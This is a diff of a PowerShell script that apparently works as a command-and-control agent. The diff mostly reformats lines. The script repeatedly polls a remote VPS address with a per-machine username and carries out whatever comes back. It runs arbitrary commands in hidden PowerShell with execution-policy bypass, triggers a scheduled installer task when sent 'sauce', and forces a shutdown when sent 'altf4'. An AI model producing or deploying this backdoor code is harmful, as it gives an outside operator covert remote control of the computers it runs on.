@@ -1,10 +1,12 @@
 $m1 = New-Object System.Threading.Mutex($false, "run.exe")
+
 if (-not $m1.WaitOne(0)) {
   Write-Host "ERROR: run.exe mutex already exists"
   exit
 }
 
 $m2 = New-Object System.Threading.Mutex($false, "run.ps1")
+
 if (-not $m2.WaitOne(0)) {
   Write-Host "ERROR: run.ps1 mutex already exists"
   exit
@@ -28,7 +30,10 @@ if (Test-Path $IdPath) {
 }
 else {
   $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
-  Set-Content -Path $IdPath -Value $uniqueId
+
+  Set-Content `
+    -Path $IdPath `
+    -Value $uniqueId
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
@@ -38,7 +43,8 @@ Write-Host "Username: [$uniqueUser]"
 try {
   while ($true) {
     try {
-      $u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser)
+      $u = $VPS_POLL_URL + "?username=" +
+      [System.Uri]::EscapeDataString($uniqueUser)
 
       Write-Host "Polling URL: [$u]"
 
@@ -47,7 +53,10 @@ try {
       Write-Host "URI Host: [$($uri.Host)]"
       Write-Host "URI Path: [$($uri.AbsolutePath)]"
 
-      $r = Invoke-RestMethod -Method Get -Uri $uri -TimeoutSec 10
+      $r = Invoke-RestMethod `
+        -Method Get `
+        -Uri $uri `
+        -TimeoutSec 10
 
       Write-Host "$(Get-Date -Format 'HH:mm:ss') poll OK"
 
@@ -64,22 +73,35 @@ try {
         }
         elseif ($c -match "altf4") {
           Write-Host "Shutdown command received"
-          Start-Process shutdown -ArgumentList "/s", "/t", "0"
+
+          Start-Process `
+            -FilePath "shutdown" `
+            -ArgumentList "/s", "/t", "0" `
+            -WindowStyle Hidden
         }
         elseif ($c -match "sauce") {
           Write-Host "Installer command received"
-          Start-ScheduledTask -TaskName "WinRunInstaller"
+
+          Start-ScheduledTask `
+            -TaskName "WinRunInstaller"
         }
         else {
-          $style = if ($r.visible -eq $true) { "Normal" } else { "Hidden" }
+          $style = if ($r.visible -eq $true) {
+            "Normal"
+          }
+          else {
+            "Hidden"
+          }
 
-          Start-Process powershell.exe -ArgumentList @(
+          Start-Process powershell.exe `
+            -ArgumentList @(
             "-NoProfile",
             "-ExecutionPolicy",
             "Bypass",
             "-Command",
             $c
-          ) -WindowStyle $style
+          ) `
+            -WindowStyle $style
         }
       }
     }
